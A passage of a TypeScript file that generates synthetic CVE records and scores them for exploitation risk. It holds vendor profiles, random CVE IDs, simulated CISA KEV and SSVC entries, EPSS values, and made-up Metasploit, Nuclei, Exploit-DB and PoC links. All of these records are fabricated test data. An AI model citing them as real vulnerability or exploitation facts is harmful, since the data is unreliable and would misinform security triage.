    products: [prod('Fortinet', 'FortiOS', P(21)), prod('Fortinet', 'FortiProxy', P(7)), prod('Fortinet', 'FortiWeb', P(4)), prod('Fortinet', 'FortiSandbox', P(1)), prod('Fortinet', 'FortiManager', P(2)), prod('Fortinet', 'FortiClientEMS', P(2)), prod('Fortinet', 'FortiSIEM', P(2)), prod('Fortinet', 'FortiVoice', P(1))],
    kinds: ['auth', 'cmdi', 'overflow', 'path', 'sqli', 'creds', 'xss'] },
  { cna: 'paloalto', total: 21, style: 'colon', domain: 'security.paloaltonetworks.com', version: '4.0', exploitWeight: 7, artifactWeight: 2,
    products: [prod('Palo Alto Networks', 'PAN-OS', P(7)), prod('Palo Alto Networks', 'GlobalProtect App', V(9)), prod('Palo Alto Networks', 'Cortex XDR Agent', V(9))], kinds: ['cmdi', 'auth', 'dos', 'eop', 'xss'] },
  { cna: 'ivanti', total: 26, style: 'none', domain: 'forums.ivanti.com', exploitWeight: 12, artifactWeight: 3,
    products: [prod('Ivanti', 'Endpoint Manager', P(6)), prod('Ivanti', 'Endpoint Manager Mobile', P(4)), prod('Ivanti', 'Connect Secure', P(8)), prod('Ivanti', 'Policy Secure', P(3)), prod('Ivanti', 'Neurons for ITSM', V(30))], kinds: ['auth', 'cmdi', 'deser', 'sqli', 'path', 'xss'] },
  { cna: 'sap', total: 31, style: 'vuln', domain: 'me.sap.com', exploitWeight: 3,
    products: [prod('SAP_SE', 'SAP NetWeaver Application Server ABAP', P(3)), prod('SAP_SE', 'SAP NetWeaver Visual Composer', P(1)), prod('SAP_SE', 'SAP S/4HANA', V(9)), prod('SAP_SE', 'SAP BusinessObjects Business Intelligence Platform', V(9))], kinds: ['authz', 'deser', 'xss', 'info', 'cmdi'] },
  { cna: 'siemens', total: 42, style: 'vuln', tz: 'eu', domain: 'cert-portal.siemens.com', version: '4.0',
    products: [prod('Siemens', 'SIMATIC S7-1500 CPU', V(7)), prod('Siemens', 'SINEC NMS', V(7)), prod('Siemens', 'Teamcenter', V(7)), prod('Siemens', 'SCALANCE M-800', V(7)), prod('Siemens', 'RUGGEDCOM ROX', V(7))], kinds: ['dos', 'auth', 'cmdi', 'overflow', 'info'] },
  { cna: 'citrix', total: 9, style: 'colon', domain: 'support.citrix.com', exploitWeight: 14, artifactWeight: 4,
    products: [prod('Citrix', 'NetScaler ADC', P(9)), prod('Citrix', 'NetScaler Gateway', P(9))], kinds: ['oob', 'overflow', 'auth', 'redirect'] },
  { cna: 'f5', total: 18, style: 'vuln', domain: 'my.f5.com', exploitWeight: 3,
    products: [prod('F5', 'BIG-IP', P(6)), prod('F5', 'NGINX Plus', V(7)), prod('F5', 'BIG-IQ', V(7))], kinds: ['dos', 'auth', 'cmdi', 'xss'] },
  { cna: 'vmware', total: 12, style: 'colon', domain: 'support.broadcom.com', exploitWeight: 6,
    products: [prod('VMware', 'VMware ESXi', P(6)), prod('VMware', 'VMware vCenter Server', P(5)), prod('VMware', 'VMware Tools', P(2))], kinds: ['overflow', 'eop', 'info', 'auth'] },
  { cna: 'atlassian', total: 15, style: 'vuln', domain: 'jira.atlassian.com', exploitWeight: 3,
    products: [prod('Atlassian', 'Confluence Data Center', P(6)), prod('Atlassian', 'Jira Software Data Center', V(9)), prod('Atlassian', 'Bamboo Data Center', V(9))], kinds: ['ssrf', 'dos', 'rce', 'xss'] },
  { cna: 'JetBrains', total: 30, style: 'none', domain: 'www.jetbrains.com', exploitWeight: 2,
    products: [prod('JetBrains', 'TeamCity', P(3)), prod('JetBrains', 'YouTrack'), prod('JetBrains', 'Hub'), prod('JetBrains', 'Toolbox App')], kinds: ['xss', 'auth', 'path', 'info', 'csrf'] },
  { cna: 'Samsung Mobile', total: 35, style: 'none', tz: 'asia', domain: 'security.samsungmobile.com',
    products: [prod('Samsung Mobile', 'Samsung Mobile Devices', P(9)), prod('Samsung Mobile', 'Galaxy Store', V(9))], kinds: ['eop', 'info', 'oob', 'authz'] },
  { cna: 'qualcomm', total: 42, style: 'none', domain: 'docs.qualcomm.com', exploitWeight: 1.4,
    products: [prod('Qualcomm, Inc.', 'Snapdragon', P(8))], kinds: ['overflow', 'eop', 'dos', 'info'] },
  { cna: 'apple', total: 64, style: 'none', batches: [['2026-10-01', 58, 21]], cvssRate: 0, ssvc: 0.95, domain: 'support.apple.com', exploitWeight: 6, aiWeight: 0.8,
    products: [prod('Apple', 'macOS', P(22)), prod('Apple', 'iOS and iPadOS', P(31)), prod('Apple', 'Safari', P(9)), prod('Apple', 'visionOS', V(60)), prod('Apple', 'watchOS', V(60))], kinds: ['uaf', 'oob', 'info', 'sfb', 'eop', 'race'] },
  { cna: 'Android', total: 54, style: 'none', batches: [['2026-10-06', 52, 17]], cvssRate: 0.2, domain: 'source.android.com', exploitWeight: 3,
    products: [prod('Google', 'Android', P(24))], kinds: ['eop', 'info', 'dos', 'oob'] },
  { cna: 'zdi', total: 61, style: 'vuln', domain: 'www.zerodayinitiative.com', artifactWeight: 0.8,
    products: [prod('Autodesk', 'Revit'), prod('Ashlar-Vellum', 'Cobalt'), prod('PDF-XChange', 'PDF-XChange Editor'), prod('Foxit', 'PDF Reader', V(1)), prod('Trimble', 'SketchUp'), prod('Kofax', 'Power PDF')], kinds: ['overflow', 'uaf', 'oob', 'rce'] },
  { cna: 'twcert', total: 30, style: 'vuln', tz: 'asia', domain: 'www.twcert.org.tw',
    products: [prod('Digiwin', 'EasyFlow .NET'), prod('WellChoose', 'Single Sign On Portal'), prod('Hgiga', 'iSherlock'), prod('Sunnet', 'CTMS')], kinds: ['sqli', 'path', 'cmdi', 'auth', 'upload'] },
  { cna: 'jpcert', total: 25, style: 'vuln', tz: 'asia', domain: 'jvn.jp',
    products: [prod('ELECOM CO.,LTD.', 'WRC-X3000GS3'), prod('I-O DATA DEVICE, INC.', 'UD-LT2', V(1)), prod('Cybozu, Inc.', 'Garoon')], kinds: ['cmdi', 'xss', 'csrf', 'path'] },
  { cna: 'CERTVDE', total: 30, style: 'vuln', tz: 'eu', domain: 'certvde.com',
    products: [prod('Phoenix Contact', 'CHARX SEC-3100'), prod('WAGO', 'PFC200'), prod('Helmholz', 'REX 100'), prod('MB connect line', 'mbNET')], kinds: ['cmdi', 'auth', 'dos', 'info', 'creds'] },
  { cna: 'Mattermost', total: 26, style: 'none', domain: 'mattermost.com',
    products: [prod('Mattermost', 'Mattermost Server')], kinds: ['authz', 'info', 'dos', 'xss'] },
  { cna: 'Unisoc', total: 30, style: 'none', tz: 'asia', domain: 'www.unisoc.com',
    products: [prod('Unisoc (Shanghai) Technologies Co., Ltd.', 'SC9863A/SC9832E/SC7731E/T610/T618')], kinds: ['dos', 'info', 'eop'] },
  { cna: 'Acronis', total: 40, style: 'none', tz: 'eu', domain: 'security-advisory.acronis.com',
    products: [prod('Acronis', 'Acronis Cyber Protect 16'), prod('Acronis', 'Acronis True Image')], kinds: ['eop', 'info', 'authz', 'path'] },
  { cna: 'TPLink', total: 22, style: 'vuln', tz: 'asia', domain: 'www.tp-link.com',
    products: [prod('TP-Link Systems Inc.', 'Archer AX55', P(5)), prod('TP-Link Systems Inc.', 'Omada Controller', V(8)), prod('TP-Link Systems Inc.', 'Tapo C200', V(8))], kinds: ['cmdi', 'auth', 'overflow', 'info'] },
  { cna: 'SonicWall', total: 8, style: 'none', domain: 'psirt.global.sonicwall.com', exploitWeight: 10, artifactWeight: 3,
    products: [prod('SonicWall', 'SMA 100', P(5)), prod('SonicWall', 'SonicOS', P(4))], kinds: ['auth', 'cmdi', 'path', 'overflow'] },
  { cna: 'SolarWinds', total: 11, style: 'vuln', domain: 'www.solarwinds.com', exploitWeight: 6, artifactWeight: 2,
    products: [prod('SolarWinds', 'Web Help Desk', P(3)), prod('SolarWinds', 'Serv-U', P(2)), prod('SolarWinds', 'Platform', V(9))], kinds: ['deser', 'auth', 'creds', 'path'] },
  { cna: 'trendmicro', total: 25, style: 'vuln', domain: 'success.trendmicro.com',
    products: [prod('Trend Micro, Inc.', 'Apex One', P(3)), prod('Trend Micro, Inc.', 'Deep Security Agent', V(6))], kinds: ['eop', 'info', 'path'] },
];

const PROFILES: readonly Profile[] = [
  microsoft, oracle, chrome, linux, vulncheck, github, vuldb,
  wordpress('Patchstack', 1_016, [['2026-10-06', 186, 13], ['2026-10-15', 142, 12], ['2026-10-24', 121, 11]]),
  wordpress('WPScan', 524, [['2026-10-21', 53, 6]]),
  wordpress('Wordfence', 466, [['2026-10-14', 53, 7], ['2026-10-16', 95, 6]]),
  ...TAILS.map(tail),
];

// ───────────────────────────── drafts ─────────────────────────────

interface Draft {
  id: string;
  pub: number;
  reserved: number;
  updated: number;
  cna: string;
  synth: Synth;
  ssvc: Ssvc | null;
  kev: KevInfo | null;
  epss: EpssInfo | null;
  exploits: ExploitEvidence;
  aiCredit: string | null;
  vendorItw: boolean;
  inWindow: boolean;
  profile: Profile;
  batch: { id: string; count: number; date: string } | null;
}

const usedIds = new Set<string>();
function allocateId(pub: number): string {
  const frac = (pub - WINDOW_START) / (NOW - WINDOW_START);
  for (;;) {
    const late2025 = chance(0.05);
    const year = late2025 ? 2025 : 2026;
    const n = late2025 ? int(60_000, 71_900) : Math.max(1_000, Math.min(117_400, Math.round(30_000 + 86_000 * frac + (rand() + rand() + rand() - 1.5) * 24_000)));
    const id = `CVE-${year}-${n}`;
    if (!usedIds.has(id)) {
      usedIds.add(id);
      return id;
    }
  }
}

const TZ_HOURS: Record<Profile['tz'], readonly number[]> = {
  us: [1, 1, 0.6, 0.4, 0.3, 0.3, 0.3, 0.4, 0.6, 0.8, 1, 1.2, 1.5, 1.8, 2, 2.2, 2.2, 2.2, 2, 1.8, 1.6, 1.4, 1.2, 1.1],
  eu: [0.3, 0.2, 0.2, 0.2, 0.3, 0.6, 1, 1.5, 2, 2.2, 2.2, 2, 2, 2.2, 2.2, 2, 1.8, 1.5, 1.2, 0.9, 0.7, 0.5, 0.4, 0.3],
  asia: [1.8, 2.2, 2.4, 2.4, 2.2, 2, 1.8, 1.6, 1.4, 1.2, 1, 0.8, 0.6, 0.5, 0.4, 0.4, 0.4, 0.4, 0.5, 0.6, 0.8, 1, 1.3, 1.6],
};
const HOUR_PAIRS = (tz: Profile['tz']) => TZ_HOURS[tz].map((w, h) => [h, w] as const);

/** Calendar days touched by the window, with the usable [start, end) span of each. */
const DAYS = (() => {
  const out: { date: string; start: number; end: number; weight: number }[] = [];
  for (let t = Date.UTC(2026, 8, 26); t < NOW; t += DAY) {
    const start = Math.max(t, WINDOW_START);
    const end = Math.min(t + DAY, NOW);
    const dow = new Date(t).getUTCDay();
    out.push({ date: ymd(t), start, end, weight: ((end - start) / DAY) * (dow === 0 || dow === 6 ? 0.32 : 1) });
  }
  return out;
})();

function timeInDay(day: (typeof DAYS)[number], tz: Profile['tz']): number {
  for (let i = 0; i < 50; i++) {
    const t = Date.parse(`${day.date}T00:00:00Z`) + weighted(HOUR_PAIRS(tz)) * HOUR + int(0, 3_599_999);
    if (t >= day.start && t < day.end) return t;
  }
  return day.start + Math.floor(rand() * (day.end - day.start));
}

function emptyExploits(): ExploitEvidence {
  return { metasploit: [], nuclei: [], exploitdb: [], poc: { count: 0, vetted: 0, hype: false, top: [] } };
}

function draft(profile: Profile, pub: number): Draft {
  const id = allocateId(pub);
  const synth = profile.make(id, pub);
  return {
    id,
    pub,
    reserved: pub - int(1, profile.cna === 'microsoft' || profile.cna === 'oracle' ? 140 : 45) * DAY - int(0, 86_399_999),
    updated: Math.min(NOW - int(1, 90) * 60_000, pub + int(1, 72) * HOUR),
    cna: profile.cna,
    synth,
    ssvc: null,
    kev: null,
    epss: null,
    exploits: emptyExploits(),
    aiCredit: null,
    vendorItw: false,
    inWindow: true,
    profile,
    batch: null,
  };
}

function generateWindow(): Draft[] {
  const drafts: Draft[] = [];
  const septemberEnd = Date.UTC(2026, 9, 1);
  // 1. fixed patch-day batches, clustered around their release hour
  for (const p of PROFILES) {
    for (const [date, count, hour] of p.batches ?? []) {
      const day = DAYS.find((d) => d.date === date);
      if (!day) throw new Error(`batch ${p.cna} ${date} is outside the window`);
      for (let i = 0; i < count; i++) {
        const t = Date.parse(`${date}T${String(hour).padStart(2, '0')}:00:00Z`) + Math.floor(Math.abs(rand() + rand() - 1) * 75 * 60_000);
        drafts.push(draft(p, Math.min(t, day.end - 1)));
      }
    }
  }
  // 2. each profile's background volume, spread by weekday weight over its non-batch days
  for (const p of PROFILES) {
    const batchDays = new Set((p.batches ?? []).map(([date]) => date));
    const days = DAYS.filter((d) => !batchDays.has(d.date));
    const totalWeight = days.reduce((a, d) => a + d.weight, 0);
    const background = p.total - (p.batches ?? []).reduce((a, [, n]) => a + n, 0);
    let carry = 0;
    for (const day of days) {
      carry += (background * day.weight) / totalWeight;
      const n = Math.floor(carry + rand() * 0.999);
      carry -= n;
      for (let i = 0; i < n; i++) drafts.push(draft(p, timeInDay(day, p.tz)));
    }
  }
  // 3. top up (or trim) the long tail so the October and late-September totals match the real ones
  const fill = (from: number, to: number, target: number) => {
    const inSpan = () => drafts.filter((d) => d.pub >= from && d.pub < to).length;
    const days = DAYS.filter((d) => d.start >= from && d.end <= to);
    const fillers = PROFILES.filter((p) => !p.batches && p.cna !== 'microsoft');
    let missing = target - inSpan();
    while (missing > 0) {
      const day = weighted(days.map((d) => [d, d.weight] as const));
      const p = weighted(fillers.map((f) => [f, f.total] as const));
      drafts.push(draft(p, timeInDay(day, p.tz)));
      missing--;
    }
    while (missing < 0) {
      const idx = drafts.findIndex((d) => d.pub >= from && d.pub < to && !d.profile.batches);
      usedIds.delete(drafts[idx].id);
      drafts.splice(idx, 1);
      missing++;
    }
  };
  fill(Date.UTC(2026, 9, 1), NOW, OCTOBER_TOTAL);
  fill(WINDOW_START, septemberEnd, SEPTEMBER_TAIL_TOTAL);
  return drafts.sort((a, b) => a.pub - b.pub);
}

// ───────────────────────────── evidence ─────────────────────────────

const ageDays = (d: Draft) => (NOW - d.pub) / DAY;

function weightedSample<T>(items: readonly T[], weight: (x: T) => number, n: number): T[] {
  // Efraimidis–Spirakis: key = u^(1/w), keep the n largest.
  return items
    .map((x) => ({ x, k: Math.pow(rand(), 1 / Math.max(weight(x), 1e-9)) }))
    .sort((a, b) => b.k - a.k)
    .slice(0, n)
    .map((e) => e.x);
}

const severityWeight = (d: Draft) => {
  const s = d.synth.cvss?.score ?? 6;
  return s >= 9 ? 3 : s >= 7 ? 2 : 0.7;
};

function baseEvidence(d: Draft): void {
  const age = ageDays(d);
  // CISA-ADP SSVC usually lands within a day.
  if (age > 0.6 && chance(d.profile.ssvc)) {
    const vuldbPoc = d.cna === 'VulDB' && chance(0.85);
    const automatable = d.synth.cvss?.vector.includes('AV:N') && d.synth.cvss.vector.includes('PR:N') ? chance(0.3) : chance(0.05);
    d.ssvc = {
      exploitation: vuldbPoc || chance(0.04) ? 'poc' : 'none',
      automatable: automatable ? 'yes' : 'no',
      technical_impact: (d.synth.cvss?.score ?? 5) >= 8.5 ? (chance(0.62) ? 'total' : 'partial') : chance(0.37) ? 'total' : 'partial',
      version: '2.0.3',
      timestamp: iso(d.pub + int(2, 30) * HOUR),
    };
    if (Date.parse(d.ssvc.timestamp!) > NOW) d.ssvc.timestamp = iso(NOW - int(5, 50) * 60_000);
  }
  // EPSS scores new CVEs within about a day.
  if (age > 0.8 || chance(0.25)) {
    const crit = (d.synth.cvss?.score ?? 0) >= 9 ? 3 : 1;
    const e = Math.min(0.95, Math.exp(Math.log(0.0004) + rand() * 2.4 + (rand() < 0.03 * crit ? rand() * 3.4 : 0)));
    d.epss = { score: round5(e), percentile: round5(percentileOf(e)), date: ymd(NOW), model: 'v2026.06.15' };
  }
  if (chance(0.003)) addPoc(d, false);
}

const round5 = (x: number) => Math.round(x * 1e5) / 1e5;
/** Rough inverse of the 2026 EPSS distribution (most scores sit below 0.5%). */
const percentileOf = (e: number) => Math.min(0.99998, 1 - Math.exp(-Math.pow(e / 0.0021, 0.55) * 1.2));

function addPoc(d: Draft, vetted: boolean, hype = false): void {
  const count = hype ? int(55, 140) : vetted ? int(1, 6) : 1;
  const firstAt = Math.min(NOW - HOUR, d.pub + int(2, 120) * HOUR);
  const top = Array.from({ length: Math.min(5, count) }, (_, i) => ({
    url: `https://github.com/${pick(POC_AUTHORS)}/${d.id}${pick(['', '-PoC', '-exploit', '_scanner', '-RCE'])}${i ? `-${i}` : ''}`,
    stars: vetted ? int(2, 380) >> i : 0,
    created: iso(vetted ? Math.min(firstAt, NOW - 4 * DAY) : Math.max(firstAt, NOW - 2 * DAY)),
  })).sort((a, b) => b.stars - a.stars);
  d.exploits.poc = { count, vetted: vetted ? Math.max(1, Math.round(count * 0.6)) : 0, hype, top };
}

const PLATFORM: Record<string, string> = { microsoft: 'windows', apple: 'osx', Linux: 'linux', Chrome: 'multi', Android: 'android' };
function addMetasploit(d: Draft): void {
  const slug = slugify(`${d.synth.product || d.cna} ${d.synth.cwe[0] === 'CWE-89' ? 'sqli' : 'rce'}`).replace(/-/g, '_');
  const platform = PLATFORM[d.cna] ?? pick(['linux', 'multi', 'unix']);
  const fullname = `exploit/${platform}/http/${slug}`;
  const rank = weighted<number>([[600, 5], [500, 2], [400, 2], [300, 1]]);
  d.exploits.metasploit.push({ name: `${d.synth.product || 'Target'} Unauthenticated RCE`, fullname, rank, type: 'exploit', url: `https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/${platform}/http/${slug}.rb` });
}
function addNuclei(d: Draft): void {
  const year = d.id.slice(4, 8);
  const path = `http/cves/${year}/${d.id}.yaml`;
  d.exploits.nuclei.push({ path, severity: (d.synth.cvss?.severity ?? 'high').toLowerCase(), url: `https://github.com/projectdiscovery/nuclei-templates/blob/main/${path}` });
}
function addExploitDb(d: Draft): void {
  const id = String(int(52_100, 52_480));
  d.exploits.exploitdb.push({ id, verified: chance(0.3), url: `https://www.exploit-db.com/exploits/${id}`, date: ymd(Math.min(NOW - DAY, d.pub + int(1, 10) * DAY)) });
}
function addHighEpss(d: Draft): void {
  const e = 0.1 + rand() * 0.8;
  d.epss = { score: round5(e), percentile: round5(0.97 + rand() * 0.0299), date: ymd(NOW), model: 'v2026.06.15' };
}

const KEV_ACTION = 'Apply mitigations per vendor instructions, follow applicable BOD 26-04 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.';
const KEV_ACTION_FORENSIC = 'Apply mitigations in accordance with vendor instructions and complete CISA’s “Forensics Triage Requirements” (see URL in Notes) for every internet-facing instance before returning it to service.';
function addKev(d: Draft, added: number): void {
  const forensic = chance(0.35);
  const dueDays = forensic ? 3 : weighted<number>([[7, 0.3], [21, 0.7]]);
  const vendor = d.synth.vendor || 'Unknown';
  const product = d.synth.product || 'Multiple Products';
  const kindLabel = d.synth.title?.match(/(Remote Code Execution|Elevation of Privilege|Authentication Bypass|Command Injection|Path Traversal|SQL Injection|Use After Free|Deserialization)/i)?.[0] ?? pick(['Improper Authentication', 'OS Command Injection', 'Use-After-Free', 'Out-of-Bounds Write', 'Code Injection', 'Missing Authorization']);
  d.kev = {
    date_added: ymd(added),
    due_date: ymd(added + dueDays * DAY),
    ransomware: chance(0.14) ? 'Known' : 'Unknown',
    forensic_triage: forensic,
    name: `${product.toLowerCase().startsWith(vendor.toLowerCase()) ? product : `${vendor} ${product}`} ${titleCase(kindLabel)} Vulnerability`,
    required_action: forensic ? KEV_ACTION_FORENSIC : KEV_ACTION,
    notes: `${d.synth.references[0] ?? `https://www.cve.org/CVERecord?id=${d.id}`} ; https://www.cve.org/CVERecord?id=${d.id}`,
  };
}

/** Set the exploit-maturity (E) metric of a CVSS vector. */
const withMaturity = (vector: string, e: string) => (/\/E:[A-Z]/.test(vector) ? vector.replace(/\/E:[A-Z]/, `/E:${e}`) : `${vector}/E:${e}`);

function markExploited(d: Draft): void {
  const age = ageDays(d);
  const roll = rand();
  if (roll < 0.42 && age > 0.3) {
    addKev(d, Math.min(NOW - int(1, 5) * HOUR, d.pub + Math.floor(rand() * Math.min(age, 9)) * DAY + int(2, 20) * HOUR));
    if (chance(0.4) && d.ssvc) d.ssvc.exploitation = 'active';
  } else if (roll < 0.68 && d.cna !== 'VulDB') {
    d.ssvc ??= { exploitation: 'active', automatable: chance(0.4) ? 'yes' : 'no', technical_impact: 'total', version: '2.0.3', timestamp: iso(Math.min(NOW - HOUR, d.pub + 6 * HOUR)) };
    d.ssvc.exploitation = 'active';
  } else if (roll < 0.88 || !d.synth.cnaVector) {
    d.vendorItw = true;
    d.synth.description += ` ${d.cna === 'apple' ? 'Apple is aware of a report that this issue may have been exploited in an extremely sophisticated attack against specific targeted individuals.' : d.cna === 'fortinet' ? 'Fortinet has observed this to be exploited in the wild.' : 'The vendor is aware of reports that this vulnerability has been exploited in the wild.'}`;
  } else if (d.synth.cvss) {
    d.synth.cvss.vector = withMaturity(d.synth.cvss.vector, d.synth.cvss.version === '4.0' ? 'A' : 'F');
  }
  if (chance(0.12)) addMetasploit(d);
  if (chance(0.2)) addNuclei(d);
  if (chance(0.45)) addPoc(d, true, chance(0.08));
  if (chance(0.08)) addExploitDb(d);
  if (age >= COLD_START_DAYS && chance(0.6)) addHighEpss(d);
}

function addArtifact(d: Draft): void {
  const roll = rand();
  if (roll < 0.21) addNuclei(d);
  else if (roll < 0.26) addMetasploit(d);
  else if (roll < 0.76) addPoc(d, true);
  else if (roll < 0.86) addExploitDb(d);
  else if (ageDays(d) >= COLD_START_DAYS) addHighEpss(d);
  else addPoc(d, true);
  if (chance(0.15)) addPoc(d, true);
}

function assignEvidence(drafts: Draft[]): void {
  for (const d of drafts) baseEvidence(d);
  // Patch-day zero-days first (Patch Tuesday always ships a few), then a weighted draw for the rest.
  const zeroDays = ZERO_DAYS.flatMap(([cna, n]) => drafts.filter((d) => d.cna === cna && d.batch && d.synth.prior.kind === 'product').slice(0, n));
  const pool = drafts.filter((d) => !zeroDays.includes(d));
  const exploited = [...zeroDays, ...weightedSample(pool, (d) => d.profile.exploitWeight * severityWeight(d) * (d.synth.prior.kind === 'product' ? 2 : 1), Math.round(drafts.length * EXPLOITED_SHARE) - zeroDays.length)];
  const chosen = new Set(exploited);
  for (const d of exploited) markExploited(d);
  const rest = drafts.filter((d) => !chosen.has(d));
  for (const d of weightedSample(rest, (d) => d.profile.artifactWeight * severityWeight(d), Math.round(drafts.length * ARTIFACT_SHARE))) addArtifact(d);
  for (const d of weightedSample(drafts, (d) => d.profile.aiWeight, Math.round(drafts.length * 0.016))) d.aiCredit = weighted(AI_CREDITS);
  // A few CNAs mark proof-of-concept maturity in their own vectors (VulDB's blanket E:P is ignored by the model).
  for (const d of drafts) if (d.synth.cnaVector && d.synth.cvss && !d.kev && chance(0.004)) d.synth.cvss.vector = withMaturity(d.synth.cvss.vector, 'P');
}

// ───────────────────────────── scoring (shared model) ─────────────────────────────

interface Scored {
  d: Draft;
  score: number;
  raw: number;
  tier: Tier;
  exploited: boolean;
  weaponized: boolean;
  reasons: Reason[];
  unknowns: string[];
}

const cveUrl = (id: string) => `https://www.cve.org/CVERecord?id=${id}`;
const kevUrl = (q: string) => `https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=${encodeURIComponent(q)}`;
const MSF_RANK: Record<number, string> = { 600: 'excellent', 500: 'great', 400: 'good', 300: 'normal', 200: 'average', 100: 'low', 0: 'manual' };

function reason(id: string, label: string, points: number, extra: Partial<Pick<Reason, 'url' | 'at' | 'source'>> = {}): Reason {
  const def = CHIP_BY_ID[id];
  if (!def) throw new Error(`unknown chip ${id}`);
  return { id, label, polarity: def.polarity, family: def.family, points, source: extra.source ?? def.source, ...(extra.url ? { url: extra.url } : {}), ...(extra.at ? { at: extra.at } : {}) };
}

/** Exploit-maturity letter from a CNA vector (VulDB vectors are ignored by the model). */
function cnaMaturity(d: Draft): string | null {
  if (!d.synth.cnaVector || d.cna === 'VulDB' || !d.synth.cvss) return null;
  return d.synth.cvss.vector.match(/\/E:([A-Z])/)?.[1] ?? null;
}

function score(d: Draft): Scored {
  const age = ageDays(d);
  const ageInt = Math.max(0, Math.floor(age));
  const maturity = cnaMaturity(d);
  const cvss = d.synth.cvss;
  const ex = d.exploits;
  const ssvcAt = d.ssvc?.timestamp ?? undefined;

  // E — confirmed exploitation
  const e: Reason[] = [];
  if (d.kev) e.push(reason('kev.listed', `CISA KEV · added ${shortDate(Date.parse(d.kev.date_added))} · due ${shortDate(Date.parse(d.kev.due_date))}`, 0, { url: kevUrl(d.id), at: d.kev.date_added }));
  if (d.ssvc?.exploitation === 'active') e.push(reason('ssvc.active', `CISA SSVC: exploitation active · ${shortDate(Date.parse(ssvcAt!))}`, 0, { url: cveUrl(d.id), at: ssvcAt }));
  if (maturity === 'A' || maturity === 'F' || maturity === 'H') e.push(reason('vendor.exploited', `${d.cna} CVSS vector says exploitation is active (E:${maturity})`, 0, { url: cveUrl(d.id) }));
  if (d.vendorItw) e.push(reason('vendor.itw', `${d.cna} says exploited in the wild · ${shortDate(d.pub)}`, 0, { url: cveUrl(d.id), at: iso(d.pub) }));
  const exploited = e.length > 0;
  const ransomware = exploited && d.kev?.ransomware === 'Known';

  // X — exploit artifacts and prediction (strongest counts)
  const x: Reason[] = [];
  const epssOk = age >= COLD_START_DAYS && d.epss !== null;
  const epssLabel = (s: EpssInfo) => `EPSS ${pct(s.score)} · ${ordinal(Math.floor(s.percentile * 100))} pct`;
  const epssUrl = `https://api.first.org/data/v1/epss?cve=${d.id}`;
  if (ex.metasploit[0]) x.push(reason('x.metasploit', `Metasploit: ${ex.metasploit[0].fullname} (${MSF_RANK[ex.metasploit[0].rank ?? 300] ?? 'normal'})`, 34, { url: ex.metasploit[0].url }));
  if (ex.nuclei[0]) x.push(reason('x.nuclei', `Nuclei template: ${ex.nuclei[0].path}${ex.nuclei[0].severity ? ` (${ex.nuclei[0].severity})` : ''}`, 30, { url: ex.nuclei[0].url }));
  if (ex.exploitdb[0]) x.push(reason('x.exploitdb', `Exploit-DB ${ex.exploitdb[0].id}${ex.exploitdb[0].verified ? ' (verified)' : ''}${ex.exploitdb[0].date ? ` · ${shortDate(Date.parse(ex.exploitdb[0].date))}` : ''}`, 28, { url: ex.exploitdb[0].url, at: ex.exploitdb[0].date ?? undefined }));
  if (epssOk && d.epss!.score >= 0.1) x.push(reason('epss.high', epssLabel(d.epss!), 27, { url: epssUrl, at: d.epss!.date }));
  if (ex.poc.vetted > 0) x.push(reason('x.poc', `${ex.poc.count} PoC repo${ex.poc.count === 1 ? '' : 's'} (${ex.poc.vetted} vetted) — unverified, may be malware`, 20, { url: ex.poc.top[0]?.url, at: ex.poc.top[0]?.created }));
  if (d.ssvc?.exploitation === 'poc') x.push(reason('ssvc.poc', 'CISA SSVC: public proof of concept', 10, { url: cveUrl(d.id), at: ssvcAt }));
  if (maturity === 'P') x.push(reason('vendor.poc', `${d.cna} CVSS vector: proof of concept exists (E:P)`, 10, { url: cveUrl(d.id) }));
  if (epssOk && d.epss!.score >= 0.01 && d.epss!.score < 0.1) x.push(reason('epss.mid', epssLabel(d.epss!), 8, { url: epssUrl, at: d.epss!.date }));
  x.sort((a, b) => b.points - a.points);
  x.forEach((r, i) => i > 0 && (r.points = 0));
  if (x.length === 0) {
    if (age >= COLD_START_DAYS) x.push(reason('x.none', `No public exploit after ${ageInt} days · EPSS ${d.epss ? pct(d.epss.score) : 'unscored'}`, -14));
    else x.push(reason('x.too_new', `Too new for exploit feeds (${ageInt === 0 ? 'today' : `${ageInt} day${ageInt === 1 ? '' : 's'} old`})`, 0));
  }
  const xPoints = x[0].points;

  // SEV
  const sev: Reason[] = [];
  if (!cvss) sev.push(reason('sev.none', 'No CVSS from the CNA or CISA-ADP', 0));
  else {
    const net = cvss.vector.includes('AV:N');
    const tag = `(v${cvss.version})`;
    const src: SourceId = cvss.source === 'cna' ? 'cvelist' : 'cisa-adp';
    if (cvss.score >= 9 && net) sev.push(reason('sev.crit_net', `Critical ${cvss.score.toFixed(1)} · network ${tag}`, 13, { source: src }));
    else if (cvss.score >= 9) sev.push(reason('sev.crit', `Critical ${cvss.score.toFixed(1)} · ${cvss.vector.includes('AV:L') ? 'local' : 'adjacent'} ${tag}`, 6, { source: src }));
    else if (cvss.score >= 7) sev.push(reason('sev.high', `High ${cvss.score.toFixed(1)}${net ? ' · network' : ''} ${tag}`, 1, { source: src }));
    else sev.push(reason('sev.low', `${cvss.score >= 4 ? 'Medium' : 'Low'} ${cvss.score.toFixed(1)} ${tag}`, -13, { source: src }));
  }
  const sevPoints = sev[0].points;

  // SSVC decision points (independent, they add)
  const ssvc: Reason[] = [];
  if (d.ssvc) {
    ssvc.push(d.ssvc.technical_impact === 'total' ? reason('ssvc.total', 'CISA SSVC: total technical impact', 8, { url: cveUrl(d.id), at: ssvcAt }) : reason('ssvc.partial', 'CISA SSVC: partial technical impact', -6, { url: cveUrl(d.id), at: ssvcAt }));
    ssvc.push(d.ssvc.automatable === 'yes' ? reason('ssvc.automatable', 'CISA SSVC: automatable', 6, { url: cveUrl(d.id), at: ssvcAt }) : reason('ssvc.not_automatable', 'CISA SSVC: not automatable', -2, { url: cveUrl(d.id), at: ssvcAt }));
  } else ssvc.push(reason('ssvc.missing', 'No CISA SSVC assessment yet', 0));
  const ssvcPoints = ssvc.reduce((a, r) => a + r.points, 0);

  // PRIOR
  const pr = d.synth.prior;
  const who = d.synth.product || d.synth.vendor || d.cna;
  const prior: Reason[] = [];
  if (!d.synth.vendor && !d.synth.product) {
    // No affected entry: nothing to match against KEV (listed under unknowns instead).
  } else prior.push(
    pr.kind === 'product'
      ? reason('prior.product', `Product in KEV (×${pr.count}): ${who}`, 10, { url: kevUrl(d.synth.product) })
      : pr.kind === 'vendor'
